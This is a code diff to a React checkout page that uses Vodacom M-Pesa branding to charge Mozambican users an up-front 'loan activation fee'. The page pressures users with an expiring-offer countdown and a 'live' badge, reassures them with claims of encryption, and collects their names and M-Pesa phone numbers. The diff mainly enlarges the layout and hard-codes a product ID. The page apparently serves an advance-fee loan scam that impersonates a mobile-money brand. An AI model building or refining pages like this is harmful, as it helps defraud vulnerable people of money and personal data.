@@ -58,7 +58,8 @@ function TxunaCheckout() {
   const [modal, setModal] = useState<{ status: "processing" | "pending" | "paid" | "failed"; id?: string } | null>(null);
   const checkingRef = useRef(false);
 
-  const amount = PLANS.find((p) => p.id === plan)!.price;
+  const selectedPlan = PLANS.find((p) => p.id === plan);
+  const amount = selectedPlan?.price ?? PLANS[0].price;
   const digits = phone.replace(/\D/g, "");
   const ready = name.trim().length >= 3 && digits.length === 9 && !!product?.id;
 
@@ -66,7 +67,7 @@ function TxunaCheckout() {
     mutationFn: () =>
       checkout({
         data: {
-          product_id: product!.id,
+          product_id: product?.id ?? "",
           amount_mzn: amount,
           customer_name: name.trim(),
           customer_phone: `258${digits}`,
@@ -123,29 +124,31 @@ function TxunaCheckout() {
       `}</style>
 
       {/* Header */}
-      <header className="bg-white px-4 py-3 flex items-center gap-3 border-b border-slate-100">
-        <img src="/brands/mpesa.png" alt="Logótipo M-Pesa" className="w-11 h-11 rounded-xl" />
-        <div className="flex-1 min-w-0">
-          <p className="text-lg font-extrabold leading-tight" style={{ color: "#e60000" }}>
-            Vodacom <span className="text-slate-300 font-bold">|</span> M-Pesa
-          </p>
-          <p className="text-[11px] tracking-[0.15em] text-slate-400 font-medium uppercase">Emprestimos M-Pesa</p>
+      <header className="bg-white border-b border-slate-100 shadow-sm">
+        <div className="mx-auto flex max-w-[680px] items-center gap-4 px-6 py-5">
+          <img src="/brands/mpesa.png" alt="Logótipo M-Pesa" className="h-14 w-14 rounded-xl" />
+          <div className="flex-1 min-w-0">
+            <p className="text-xl font-extrabold leading-tight" style={{ color: "#e60000" }}>
+              Vodacom <span className="text-slate-300 font-bold">|</span> M-Pesa
+            </p>
+            <p className="text-[12px] tracking-[0.18em] text-slate-500 font-semibold uppercase">Empréstimos M-Pesa</p>
+          </div>
+          <span className="flex items-center gap-2 text-[13px] font-extrabold px-4 py-2 rounded-full" style={{ background: "#fee2e2", color: "#e60000" }}>
+            <span className="w-2.5 h-2.5 rounded-full" style={{ background: "#e60000", animation: "txPulse 1.4s ease-in-out infinite" }} />
+            AO VIVO
+          </span>
         </div>
-        <span className="flex items-center gap-2 text-[12px] font-bold px-3 py-1.5 rounded-full" style={{ background: "#fee2e2", color: "#e60000" }}>
-          <span className="w-2 h-2 rounded-full" style={{ background: "#e60000", animation: "txPulse 1.4s ease-in-out infinite" }} />
-          AO VIVO
-        </span>
       </header>
 
-      <main className="px-4 py-5 space-y-4 max-w-md mx-auto pb-16">
+      <main className="px-5 py-7 space-y-6 max-w-[680px] mx-auto pb-16">
         {/* Urgency */}
-        <div className="tx-card rounded-2xl px-5 py-4 flex items-center justify-center gap-3 text-white font-bold" style={{ background: "#e60000" }}>
-          <Clock className="h-5 w-5" />
+        <div className="tx-card rounded-3xl px-6 py-5 flex items-center justify-center gap-3 text-white text-lg font-extrabold" style={{ background: "#e60000" }}>
+          <Clock className="h-6 w-6" />
           <span>A oferta expira em:</span>
-          <Countdown />
+          <strong><Countdown /></strong>
         </div>
 
-        <div className="flex items-center justify-between text-sm">
+        <div className="flex items-center justify-between text-base">
           <span className="flex items-center gap-2 text-slate-500 font-medium">
             <span className="w-2.5 h-2.5 rounded-full" style={{ background: "#e60000" }} />
             M-Pesa Moçambique
@@ -156,40 +159,40 @@ function TxunaCheckout() {
         </div>
 
         {/* Produto */}
-        <section className="tx-card bg-white rounded-2xl p-5 flex items-center gap-4">
-          <img src="/brands/mpesa.png" alt="M-Pesa" className="w-14 h-14 rounded-xl" />
+        <section className="tx-card bg-white rounded-3xl p-7 flex items-center gap-5 shadow-[0_14px_34px_rgba(15,23,42,0.07)]">
+          <img src="/brands/mpesa.png" alt="M-Pesa" className="w-16 h-16 rounded-xl" />
           <div>
-            <h1 className="text-[17px] font-extrabold leading-snug">Taxa de ativação Empréstimo</h1>
-            <p className="text-sm text-slate-400">Taxa única · Plano de {plan} meses</p>
+            <h1 className="text-xl font-extrabold leading-snug">Taxa de ativação Empréstimo</h1>
+            <p className="text-base text-slate-500">Taxa única · ID: 2500301e</p>
           </div>
         </section>
 
         {/* Nome */}
-        <section className="tx-card bg-white rounded-2xl p-5 space-y-3">
-          <h2 className="text-[17px] font-extrabold">Nome completo</h2>
+        <section className="tx-card bg-white rounded-3xl p-7 space-y-4 shadow-[0_14px_34px_rgba(15,23,42,0.07)]">
+          <h2 className="text-xl font-extrabold">Nome completo</h2>
           <input
             value={name}
             onChange={(e) => setName(e.target.value)}
             placeholder="Ex: Maria Silva"
-            className="w-full h-14 rounded-full border border-slate-200 px-5 text-[15px] outline-none focus:border-red-400"
+            className="w-full h-16 rounded-full border border-slate-200 px-6 text-lg outline-none focus:border-red-400"
           />
         </section>
 
         {/* Método */}
-        <section className="tx-card bg-white rounded-2xl p-5 space-y-3">
-          <h2 className="text-[17px] font-extrabold">Método de pagamento</h2>
-          <div className="rounded-2xl border-2 flex items-center gap-4 p-4" style={{ borderColor: "#e60000", background: "#fff5f5" }}>
-            <img src="/brands/mpesa.png" alt="M-Pesa" className="w-12 h-12 rounded-xl" />
+        <section className="tx-card bg-white rounded-3xl p-7 space-y-5 shadow-[0_14px_34px_rgba(15,23,42,0.07)]">
+          <h2 className="text-xl font-extrabold">Método de pagamento</h2>
+          <div className="rounded-3xl border-[3px] flex items-center gap-5 p-5" style={{ borderColor: "#e60000", background: "#fff5f5" }}>
+            <img src="/brands/mpesa.png" alt="M-Pesa" className="w-14 h-14 rounded-xl" />
             <div className="flex-1">
-              <p className="font-extrabold text-[17px]">M-Pesa</p>
-              <p className="text-sm text-slate-400">Vodacom Moçambique</p>
+              <p className="font-extrabold text-xl">M-Pesa</p>
+              <p className="text-base text-slate-500">Vodacom Moçambique</p>
             </div>
             <span className="w-5 h-5 rounded-full" style={{ background: "#e60000" }} />
           </div>
 
           {/* Planos */}
-          <h2 className="text-[17px] font-extrabold pt-2">Plano de pagamento</h2>
-          <div className="grid grid-cols-2 gap-3">
+          <h2 className="text-xl font-extrabold pt-2">Plano de pagamento</h2>
+          <div className="grid grid-cols-2 gap-5">
             {PLANS.map((p) => {
               const sel = plan === p.id;
               return (
@@ -197,10 +200,10 @@ function TxunaCheckout() {
                   key={p.id}
                   type="button"
                   onClick={() => setPlan(p.id)}
-                  className="rounded-2xl border-2 py-6 px-3 text-center transition-colors"
+                  className="min-h-36 rounded-3xl border-[3px] py-7 px-3 text-center transition-colors"
                   style={sel ? { borderColor: "#e60000", background: "#fff5f5" } : { borderColor: "#e2e8f0", background: "#fff" }}
                 >
-                  <p className="text-[22px] font-extrabold">{p.label}</p>
+                  <p className="text-2xl font-extrabold">{p.label}</p>
                   {sel ? (
                     <p className="text-sm font-bold flex items-center justify-center gap-1.5 mt-1" style={{ color: "#e60000" }}>
                       <CheckCircle2 className="h-4 w-4" /> Selecionado
@@ -214,27 +217,27 @@ function TxunaCheckout() {
           </div>
 
           {/* Telefone */}
-          <h2 className="text-[17px] font-extrabold pt-2">Número M-Pesa</h2>
+          <h2 className="text-xl font-extrabold pt-2">Número M-Pesa</h2>
           <div className="flex items-center rounded-full border border-slate-200 overflow-hidden">
-            <span className="px-5 h-14 flex items-center font-extrabold bg-slate-50 text-slate-600">+258</span>
+            <span className="px-6 h-16 flex items-center text-lg font-extrabold bg-slate-50 text-slate-700">+258</span>
             <input
               value={phone}
               onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 9))}
               inputMode="numeric"
               placeholder="84/85 + 7 dígitos"
-              className="flex-1 h-14 px-4 text-[15px] outline-none"
+              className="min-w-0 flex-1 h-16 px-5 text-lg outline-none"
             />
           </div>
 
-          <div className="rounded-2xl bg-slate-50 p-4 flex gap-3 text-[13px] text-slate-500">
-            <Lock className="h-4 w-4 mt-0.5 shrink-0" />
+          <div className="rounded-3xl bg-slate-50 p-5 flex gap-4 text-base text-slate-500">
+            <Lock className="h-5 w-5 mt-0.5 shrink-0" />
             <p>Protegemos os seus dados de pagamento com criptografia ponta a ponta.</p>
           </div>
 
           <button
             onClick={() => m.mutate()}
             disabled={!ready || m.isPending}
-            className="w-full h-16 rounded-full text-white text-[17px] font-extrabold flex items-center justify-center gap-2 disabled:opacity-50"
+            className="w-full h-[72px] rounded-full text-white text-xl font-extrabold flex items-center justify-center gap-2 disabled:opacity-60"
             style={{ background: "#7fd1ae" }}
           >
             {m.isPending ? <Loader2 className="h-5 w-5" style={{ animation: "txSpin .8s linear infinite" }} /> : "🏆"}
@@ -242,7 +245,7 @@ function TxunaCheckout() {
           </button>
         </section>
 
-        <section className="tx-card bg-white rounded-2xl px-5 py-4 flex items-center justify-between text-sm">
+        <section className="tx-card bg-white rounded-3xl px-7 py-5 flex items-center justify-between text-base shadow-[0_14px_34px_rgba(15,23,42,0.05)]">
           <span className="font-extrabold">Detalhes de segurança</span>
           <span className="flex items-center gap-2 text-slate-400">
             <Lock className="h-4 w-4" /> SSL · Imediato
